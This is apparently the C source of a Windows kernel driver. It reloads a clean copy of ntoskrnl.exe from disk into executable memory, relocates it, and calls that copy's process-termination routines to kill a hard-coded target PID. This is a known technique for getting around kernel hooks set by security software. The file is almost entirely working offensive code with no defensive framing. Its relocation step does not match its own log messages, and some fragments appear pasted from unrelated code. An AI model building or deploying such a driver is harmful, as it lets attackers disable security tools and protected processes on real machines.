#define PROCESS_TERMINATE         0x0001
#define PROCESS_QUERY_INFORMATION 0x0400
#include <ntifs.h>
#include "ntreload.h"
#include <ntddk.h>
Rtl_MODULE g_RtlMod = { 0 };
static PIMAGE_NT_HEADERS64
RtlGetNtHdr64(_In_ PVOID Base)
{
    if (!Base) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)Base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)  return NULL;
    if (dos->e_lfanew < 0x40 || dos->e_lfanew > 0x1000) return NULL;

    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)((ULONG_PTR)Base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)  return NULL;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return NULL;

    return nt;
}

static BOOLEAN
RtlIsRvaInCodeSection(_In_ PVOID PeBase, _In_ ULONG Rva)
{
    PIMAGE_NT_HEADERS64 nt = RtlGetNtHdr64(PeBase);
    if (!nt) return FALSE;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;

        ULONG start = sec->VirtualAddress;
        ULONG span = max(sec->Misc.VirtualSize, sec->SizeOfRawData);
        if (span == 0) continue;

        if (Rva >= start && Rva < start + span) {
            return TRUE;
        }
    }
    return FALSE;
}
PVOID
RtlGetExport(_In_ PVOID ModBase, _In_ PCSTR Name)
{
    if (!ModBase || !Name) return NULL;

    PIMAGE_NT_HEADERS64 nt = RtlGetNtHdr64(ModBase);
    if (!nt) return NULL;

    IMAGE_DATA_DIRECTORY expDD =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDD.VirtualAddress || !expDD.Size) return NULL;

    PIMAGE_EXPORT_DIRECTORY expDir =
        (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)ModBase + expDD.VirtualAddress);

    if (!expDir->NumberOfNames || !expDir->AddressOfNames) return NULL;

    PULONG  pNameRVAs = (PULONG)((ULONG_PTR)ModBase + expDir->AddressOfNames);
    PUSHORT pOrdinals = (PUSHORT)((ULONG_PTR)ModBase + expDir->AddressOfNameOrdinals);
    PULONG  pFuncRVAs = (PULONG)((ULONG_PTR)ModBase + expDir->AddressOfFunctions);

    for (ULONG i = 0; i < expDir->NumberOfNames; i++) {
        PCSTR eName = (PCSTR)((ULONG_PTR)ModBase + pNameRVAs[i]);
        BOOLEAN match = TRUE;
        const CHAR* p = Name, * q = eName;
        while (*p && *q) {
            if (*p != *q) { match = FALSE; break; }
            p++; q++;
        }
        if (match && *p == '\0' && *q == '\0') {
            ULONG funcRva = pFuncRVAs[pOrdinals[i]];
            if (!funcRva) return NULL;
            return (PVOID)((ULONG_PTR)ModBase + funcRva);
        }
    }
    return NULL;
}
PVOID
RtlFindRunningNtBase(_Out_ PULONG ImageSize)
{
    *ImageSize = 0;
    ULONG  retLen = 0;
    PVOID  buf = NULL;
    PVOID  result = NULL;
    ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLen);
    if (retLen == 0) {
        KdPrint(("[NtReload] Failed to probe module list size\n"));
        return NULL;
    }

    retLen += 0x2000;
    buf = ExAllocatePoolWithTag(NonPagedPool, retLen, DRIVER_POOL_MISC);
    if (!buf) return NULL;

    NTSTATUS st = ZwQuerySystemInformation(
        SystemModuleInformation, buf, retLen, &retLen);

    if (NT_SUCCESS(st)) {
        PRTL_PROCESS_MODULES mods = (PRTL_PROCESS_MODULES)buf;
        if (mods->NumberOfModules > 0) {
            result = mods->Modules[0].ImageBase;
            *ImageSize = mods->Modules[0].ImageSize;
            KdPrint(("[NtReload] [P1] Running ntoskrnl:\n"));
            KdPrint(("[NtReload]       base     = %p\n", result));
            KdPrint(("[NtReload]       size     = 0x%08X\n", *ImageSize));
            KdPrint(("[NtReload]       path     = %s\n",
                mods->Modules[0].FullPathName));
        }
    }
    else {
        KdPrint(("[NtReload] ZwQuerySystemInformation failed: 0x%08X\n", st));
    }

    ExFreePoolWithTag(buf, DRIVER_POOL_MISC);
    return result;
}
NTSTATUS
RtlReadNtFromDisk(_Out_ PVOID* Buf, _Out_ PSIZE_T Size)
{
    UNICODE_STRING   uPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK  iosb;
    HANDLE           hFile = NULL;
    PVOID            buffer = NULL;
    NTSTATUS         st;

    *Buf = NULL;
    *Size = 0;

    RtlInitUnicodeString(&uPath,
        L"\\SystemRoot\\system32\\ntoskrnl.exe");

    InitializeObjectAttributes(&oa, &uPath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    st = ZwCreateFile(
        &hFile,
        GENERIC_READ | SYNCHRONIZE,
        &oa, &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0
    );
    if (!NT_SUCCESS(st)) {
        KdPrint(("[NtReload] [P2] ZwCreateFile failed: 0x%08X\n", st));
        return st;
    }
    FILE_STANDARD_INFORMATION fsi = { 0 };
    st = ZwQueryInformationFile(hFile, &iosb,
        &fsi, sizeof(fsi), FileStandardInformation);
    if (!NT_SUCCESS(st)) {
        ZwClose(hFile);
        return st;
    }

    SIZE_T fileSize = (SIZE_T)fsi.EndOfFile.QuadPart;
    if (fileSize < 0x200000UL || fileSize > 0x3000000UL) {
        KdPrint(("[NtReload] [P2] Unexpected file size: %zu\n", fileSize));
        ZwClose(hFile);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    buffer = ExAllocatePoolWithTag(NonPagedPool, fileSize, DRIVER_POOL_FILE);
    if (!buffer) {
        ZwClose(hFile);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    LARGE_INTEGER offset;
    offset.QuadPart = 0;

    st = ZwReadFile(hFile, NULL, NULL, NULL,
        &iosb, buffer, (ULONG)fileSize, &offset, NULL);
    ZwClose(hFile);

    if (!NT_SUCCESS(st)) {
        KdPrint(("[NtReload] [P2] ZwReadFile failed: 0x%08X\n", st));
        ExFreePoolWithTag(buffer, DRIVER_POOL_FILE);
        return st;
    }

    if (!RtlGetNtHdr64(buffer)) {
        KdPrint(("[NtReload] [P2] Invalid PE format on disk\n"));
        ExFreePoolWithTag(buffer, DRIVER_POOL_FILE);
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    KdPrint(("[NtReload] [P2] Read %zu bytes from disk\n", fileSize));
    *Buf = buffer;
    *Size = fileSize;
    return STATUS_SUCCESS;
}


PVOID
RtlAllocAndMapPe(
    _In_     PVOID   RawData,
    _In_opt_ PVOID   OldNtBase,
    _Out_    PSIZE_T AllocSize
)
{
    PIMAGE_NT_HEADERS64 nt = RtlGetNtHdr64(RawData);
    if (!nt) return NULL;

    ULONG soi = nt->OptionalHeader.SizeOfImage;
    *AllocSize = soi;


    PVOID newBase = ExAllocatePoolWithTag(
        (POOL_TYPE)0 /* NonPagedPoolExecute */, soi, DRIVER_POOL_MOD);
    if (!newBase) {
        KdPrint(("[NtReload] [P3] ExAllocatePool failed, size=0x%X\n", soi));
        return NULL;
    }


    RtlZeroMemory(newBase, soi);
    ULONG hdrsz = nt->OptionalHeader.SizeOfHeaders;
    RtlCopyMemory(newBase, RawData, hdrsz);


    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    ULONG nCodeSec = 0, nDataFromKernel = 0, nDataFallback = 0;

    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {

        if (sec->SizeOfRawData == 0 || sec->PointerToRawData == 0) continue;

        ULONG dstRva = sec->VirtualAddress;
        ULONG copyLen = min(sec->SizeOfRawData, sec->Misc.VirtualSize);

        /* Bounds check */
        if ((ULONG_PTR)dstRva + copyLen > soi) {
            KdPrint(("[NtReload]   [P4] Section[%02hu] '%.8s' "
                "out of bounds, skip\n", i, (PCSTR)sec->Name));
            continue;
        }

        PVOID dst = (PVOID)((ULONG_PTR)newBase + dstRva);

        if (sec->Characteristics & IMAGE_SCN_CNT_CODE) {

            PVOID src = (PVOID)((ULONG_PTR)RawData + sec->PointerToRawData);
            RtlCopyMemory(dst, src, copyLen);
            nCodeSec++;

            KdPrint(("[NtReload]   [P4] Section[%02hu] '%.8s' "
                "VA=0x%08X  Sz=0x%05X  [CODE ← disk]\n",
                i, (PCSTR)sec->Name, dstRva, copyLen));
        }
        else {
            BOOLEAN copiedFromKernel = FALSE;

            if (OldNtBase) {
                MM_COPY_ADDRESS srcAddr;
                srcAddr.VirtualAddress =
                    (PVOID)((ULONG_PTR)OldNtBase + dstRva);

                SIZE_T bytesCopied = 0;
                NTSTATUS cpSt = MmCopyMemory(
                    dst,
                    srcAddr,
                    copyLen,
                    MM_COPY_MEMORY_VIRTUAL,
                    &bytesCopied
                );

                if (NT_SUCCESS(cpSt) && bytesCopied == copyLen) {
                    copiedFromKernel = TRUE;
                    nDataFromKernel++;
                    KdPrint(("[NtReload]   [P4] Section[%02hu] '%.8s' "
                        "VA=0x%08X  Sz=0x%05X  [DATA ← running kernel]\n",
                        i, (PCSTR)sec->Name, dstRva, copyLen));
                }
                else {

                    KdPrint(("[NtReload]   [P4] Section[%02hu] '%.8s' "
                        "VA=0x%08X  MmCopyMemory status=0x%08X "
                        "copied=%zu/%u  → fallback to disk\n",
                        i, (PCSTR)sec->Name, dstRva,
                        cpSt, bytesCopied, copyLen));
                }
            }

            if (!copiedFromKernel) {
                PVOID src = (PVOID)((ULONG_PTR)RawData + sec->PointerToRawData);
                RtlCopyMemory(dst, src, copyLen);
                nDataFallback++;
                KdPrint(("[NtReload]   [P4] Section[%02hu] '%.8s' "
                    "VA=0x%08X  Sz=0x%05X  [DATA ← disk (fallback)]\n",
                    i, (PCSTR)sec->Name, dstRva, copyLen));
            }
        }
    }

    KdPrint(("[NtReload] [P3+4] New base: %p  (SizeOfImage=0x%X)\n",
        newBase, soi));
    KdPrint(("[NtReload]   Code sections (from disk)         : %u\n",
        nCodeSec));
    KdPrint(("[NtReload]   Data sections (from running kernel): %u\n",
        nDataFromKernel));
    KdPrint(("[NtReload]   Data sections (disk fallback)      : %u\n",
        nDataFallback));

    return newBase;
}


#define BYTE unsigned char
#define WORD unsigned short
#define DebugPrint(level,...)

static void ProcessRelocationEntry(
    WORD wRelocEntry,
    DWORD dwBlockRVA,
    BYTE* pNewModule,
    DWORD_PTR dwptrOldBase,
    DWORD_PTR dwptrNewBase,
    DWORD_PTR dwptrOriginalImageBase,
    SIZE_T nImageSize
)
{
    UNREFERENCED_PARAMETER(pNewModule);
    if (wRelocEntry == 0) return;

    WORD wRelocType = wRelocEntry >> 12;
    WORD wRelocOffset = wRelocEntry & 0xFFF;
    DWORD_PTR dwptrPatchRVA = dwBlockRVA + wRelocOffset;

    if (dwptrPatchRVA >= nImageSize) {
        DebugPrint(LEVEL_WARN,
            "CopySystemDllW: Relocation RVA 0x%llx exceeds image size",
            (unsigned long long)dwptrPatchRVA);
        return;
    }

    DWORD_PTR dwptrPatchAddress = dwptrNewBase + dwptrPatchRVA;

    switch (wRelocType) {
    case IMAGE_REL_BASED_DIR64:
        if (dwptrPatchRVA + sizeof(DWORD_PTR) <= nImageSize) {
            DWORD_PTR* pdwptrPatch = (DWORD_PTR*)dwptrPatchAddress;
            DWORD_PTR originalValue = *pdwptrPatch;
            *pdwptrPatch = dwptrOldBase + (originalValue - dwptrOriginalImageBase);
        }
        break;

    case IMAGE_REL_BASED_HIGHLOW:
        if (dwptrPatchRVA + sizeof(DWORD) <= nImageSize) {
            DWORD* pdwPatch = (DWORD*)dwptrPatchAddress;
            DWORD dwOriginalValue = *pdwPatch;
            DWORD dwOriginalImageBase32 = (DWORD)dwptrOriginalImageBase;
            *pdwPatch = (DWORD)(dwptrOldBase + (dwOriginalValue - dwOriginalImageBase32));
        }
        break;

    case IMAGE_REL_BASED_HIGH:
        if (dwptrPatchRVA + sizeof(WORD) <= nImageSize) {
            WORD* pwPatch = (WORD*)dwptrPatchAddress;
            WORD wOriginalValue = *pwPatch;
            WORD wOriginalImageBaseHigh = (WORD)(dwptrOriginalImageBase >> 16);
            *pwPatch = (WORD)((dwptrOldBase >> 16) + (wOriginalValue - wOriginalImageBaseHigh));
        }
        break;

    case IMAGE_REL_BASED_LOW:
        if (dwptrPatchRVA + sizeof(WORD) <= nImageSize) {
            WORD* pwPatch = (WORD*)dwptrPatchAddress;
            WORD wOriginalValue = *pwPatch;
            WORD wOriginalImageBaseLow = (WORD)(dwptrOriginalImageBase & 0xFFFF);
            *pwPatch = (WORD)((dwptrOldBase & 0xFFFF) + (wOriginalValue - wOriginalImageBaseLow));
        }
        break;

    case IMAGE_REL_BASED_ABSOLUTE:
        // No processing needed
        break;

    default:
        DebugPrint(LEVEL_WARN,
            "CopySystemDllW: Unsupported relocation type %d for %ls",
            wRelocType, lpwszDllName);
        break;
    }
}
static void ProcessRelocations(
    BYTE* pNewModule,
    BYTE* pOldBase,
    PIMAGE_NT_HEADERS pNtHeaders,
    SIZE_T nImageSize
)
{
    PIMAGE_DOS_HEADER pNewDosHeader = (PIMAGE_DOS_HEADER)pNewModule;
    PIMAGE_NT_HEADERS pNewNtHeaders = (PIMAGE_NT_HEADERS)(pNewModule + pNewDosHeader->e_lfanew);
    PIMAGE_DATA_DIRECTORY pRelocDir =
        &pNewNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (pRelocDir->Size == 0 || pRelocDir->VirtualAddress == 0) {
        DebugPrint(LEVEL_ERROR, "ProcessRelocations Invalid pRelocDir");
        return;
    }

    PIMAGE_BASE_RELOCATION pReloc =
        (PIMAGE_BASE_RELOCATION)(pNewModule + pRelocDir->VirtualAddress);
    DWORD_PTR dwptrOldBase = (DWORD_PTR)pOldBase;
    DWORD_PTR dwptrNewBase = (DWORD_PTR)pNewModule;
    DWORD_PTR originalImageBase = pNtHeaders->OptionalHeader.ImageBase;

    DWORD dwRelocBlockCount = 0;
    const DWORD dwMAX_RELOC_BLOCKS = 10000;

    while (pReloc->VirtualAddress != 0 &&
        pReloc->SizeOfBlock > 0 &&
        dwRelocBlockCount < dwMAX_RELOC_BLOCKS) {
        dwRelocBlockCount++;

        if ((BYTE*)pReloc + pReloc->SizeOfBlock > pNewModule + nImageSize) {
            DebugPrint(LEVEL_ERROR,
                "CopySystemDllW: Relocation block exceeds image boundary");
            break;
        }

        DWORD dwNumEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* pRelocData = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD j = 0; j < dwNumEntries; j++) {
            ProcessRelocationEntry(pRelocData[j], pReloc->VirtualAddress,
                pNewModule, dwptrOldBase, dwptrNewBase,
                originalImageBase, nImageSize);
        }

        pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
    }
}

NTSTATUS
RtlTerminateViaNtModule(_In_ PVOID NewNtBase, _In_ ULONG Pid)
{
    NTSTATUS  st;
    PEPROCESS pProc = NULL;

    KdPrint(("[NtReload] [P6] ------  Terminate PID=%u via New NT Module  ------\n",
        Pid));
    FN_PsLookupProcessByProcessId pfnLookup =
        (FN_PsLookupProcessByProcessId)
        RtlGetExport(NewNtBase, "PsLookupProcessByProcessId");

    if (pfnLookup) {
        KdPrint(("[NtReload] [P6] PsLookupProcessByProcessId "
            "@ NEW module: %p\n", pfnLookup));
    }
    else {
        pfnLookup = (FN_PsLookupProcessByProcessId)
            PsLookupProcessByProcessId;
        KdPrint(("[NtReload] [P6] Fallback: PsLookupProcessByProcessId "
            "@ SYSTEM: %p\n", pfnLookup));
    }

    st = pfnLookup((HANDLE)(ULONG_PTR)(ULONG64)Pid, &pProc);
    if (!NT_SUCCESS(st)) {
        KdPrint(("[NtReload] [P6] PsLookupProcessByProcessId"
            "(PID=%u): 0x%08X\n", Pid, st));
        return st;
    }
    KdPrint(("[NtReload] [P6] Found EPROCESS: %p  for PID=%u\n",
        pProc, Pid));

    FN_PsTerminateProcess pfnTermProc =
        (FN_PsTerminateProcess)RtlGetExport(NewNtBase, "PsTerminateProcess");

    if (pfnTermProc) {
        KdPrint(("[NtReload] [P6] Calling PsTerminateProcess "
            "@ NEW module: %p\n", pfnTermProc));
        st = pfnTermProc(pProc, STATUS_SUCCESS);
        KdPrint(("[NtReload] [P6] PsTerminateProcess returned: 0x%08X\n",
            st));
        ObDereferenceObject(pProc);
        return st;
    }

    KdPrint(("[NtReload] [P6] PsTerminateProcess not exported, "
        "using ObOpen + ZwTerminate path\n"));

    HANDLE hProc = NULL;
    st = ObOpenObjectByPointer(
        pProc,
        OBJ_KERNEL_HANDLE,
        NULL,
        PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION,
        *PsProcessType,
        KernelMode,
        &hProc
    );
    if (!NT_SUCCESS(st)) {
        KdPrint(("[NtReload] [P6] ObOpenObjectByPointer failed: 0x%08X\n",
            st));
        ObDereferenceObject(pProc);
        return st;
    }

    FN_ZwTerminateProcess pfnZwTerm =
        (FN_ZwTerminateProcess)RtlGetExport(NewNtBase, "ZwTerminateProcess");

    if (pfnZwTerm) {
        KdPrint(("[NtReload] [P6] ZwTerminateProcess "
            "@ NEW module: %p\n", pfnZwTerm));
    }
    else {
        pfnZwTerm = (FN_ZwTerminateProcess)ZwTerminateProcess;
        KdPrint(("[NtReload] [P6] ZwTerminateProcess fallback "
            "@ SYSTEM: %p\n", pfnZwTerm));
    }

    st = pfnZwTerm(hProc, STATUS_SUCCESS);
    KdPrint(("[NtReload] [P6] ZwTerminateProcess returned: 0x%08X\n", st));

    ZwClose(hProc);
    ObDereferenceObject(pProc);

    return st;
}


VOID
RtlCleanup(VOID)
{
    if (g_RtlMod.NewBase) {
        ExFreePoolWithTag(g_RtlMod.NewBase, DRIVER_POOL_MOD);
        g_RtlMod.NewBase = NULL;
    }
    if (g_RtlMod.RawFileData) {
        ExFreePoolWithTag(g_RtlMod.RawFileData, DRIVER_POOL_FILE);
        g_RtlMod.RawFileData = NULL;
    }
    RtlZeroMemory(&g_RtlMod, sizeof(g_RtlMod));
    KdPrint(("[NtReload] Memory freed\n"));
}

VOID
DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    RtlCleanup();
    KdPrint(("[NtReload] ===== Driver Unloaded =====\n"));
}

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS st;

    DriverObject->DriverUnload = DriverUnload;

    KdPrint(("[NtReload] =============================================\n"));
    KdPrint(("[NtReload]  NT Reload + Special Reloc Driver v%s\n",
        NTRELOAD_VERSION));
    KdPrint(("[NtReload]  Target PID = %u\n", TARGET_PID));
    KdPrint(("[NtReload] =============================================\n"));

    KdPrint(("[NtReload] >>> Phase 1: Find running ntoskrnl base\n"));

    ULONG oldSize = 0;
    PVOID oldBase = RtlFindRunningNtBase(&oldSize);
    if (!oldBase) {
        KdPrint(("[NtReload] ABORT: Cannot locate running ntoskrnl\n"));
        return STATUS_NOT_FOUND;
    }
    g_RtlMod.OldBase = (ULONG_PTR)oldBase;
    g_RtlMod.OldSize = oldSize;

    PIMAGE_NT_HEADERS64 oldNtHdr = RtlGetNtHdr64(oldBase);
    if (!oldNtHdr) {
        KdPrint(("[NtReload] ABORT: Cannot parse PE header of running ntoskrnl\n"));
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    g_RtlMod.PreferredBase = oldNtHdr->OptionalHeader.ImageBase;

    KdPrint(("[NtReload]   old_base      = %p\n", (PVOID)g_RtlMod.OldBase));
    KdPrint(("[NtReload]   preferred_base= %p\n", (PVOID)g_RtlMod.PreferredBase));
    KdPrint(("[NtReload]   KASLR delta   = 0x%016llX\n",
        g_RtlMod.OldBase - g_RtlMod.PreferredBase));

    KdPrint(("[NtReload] >>> Phase 2: Read ntoskrnl.exe from disk\n"));

    st = RtlReadNtFromDisk(&g_RtlMod.RawFileData, &g_RtlMod.RawFileSize);
    if (!NT_SUCCESS(st)) {
        KdPrint(("[NtReload] ABORT: RtlReadNtFromDisk: 0x%08X\n", st));
        return st;
    }

    KdPrint(("[NtReload] >>> Phase 3+4: Alloc executable pool + map PE sections\n"));
    KdPrint(("[NtReload]   CODE  sections ← disk file\n"));
    KdPrint(("[NtReload]   DATA  sections ← running kernel @ %p  (v1.1 fix)\n",
        (PVOID)g_RtlMod.OldBase));

    g_RtlMod.NewBase = RtlAllocAndMapPe(
        g_RtlMod.RawFileData,
        (PVOID)g_RtlMod.OldBase,   /* v1.1: Pass running kernel base address */
        &g_RtlMod.NewSize
    );
    if (!g_RtlMod.NewBase) {
        KdPrint(("[NtReload] ABORT: RtlAllocAndMapPe failed\n"));
        RtlCleanup();
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    KdPrint(("[NtReload]   new_base      = %p\n", g_RtlMod.NewBase));
    KdPrint(("[NtReload]   new_size      = 0x%zX\n", g_RtlMod.NewSize));


    KdPrint(("[NtReload] >>> Phase 5: Apply special relocations\n"));
    KdPrint(("[NtReload]   CODE targets → newBase (%p)\n", g_RtlMod.NewBase));
    KdPrint(("[NtReload]   DATA targets → oldBase (%p)\n",
        (PVOID)g_RtlMod.OldBase));

    // Get new module NT headers for relocation
    PIMAGE_NT_HEADERS64 newNtHdr = RtlGetNtHdr64(g_RtlMod.NewBase);
    if (newNtHdr) {
        ProcessRelocations(
            (BYTE*)g_RtlMod.NewBase,
            (BYTE*)g_RtlMod.OldBase,
            (PIMAGE_NT_HEADERS)newNtHdr,
            (ULONG)g_RtlMod.NewSize
        );
    } else {
        KdPrint(("[NtReload] ERROR: Cannot get NT headers from new module\n"));
    }
    KdPrint(("[NtReload] >>> Phase 6: Terminate PID=%u via new NT module\n",
        TARGET_PID));

    st = RtlTerminateViaNtModule(g_RtlMod.NewBase, TARGET_PID);

    KdPrint(("[NtReload] =============================================\n"));
    if (NT_SUCCESS(st)) {
        KdPrint(("[NtReload]  RESULT: SUCCESS - PID=%u terminated\n",
            TARGET_PID));
    }
    else {
        KdPrint(("[NtReload]  RESULT: 0x%08X  (see KdPrint above)\n", st));
    }
    KdPrint(("[NtReload] =============================================\n"));

    return STATUS_SUCCESS;
}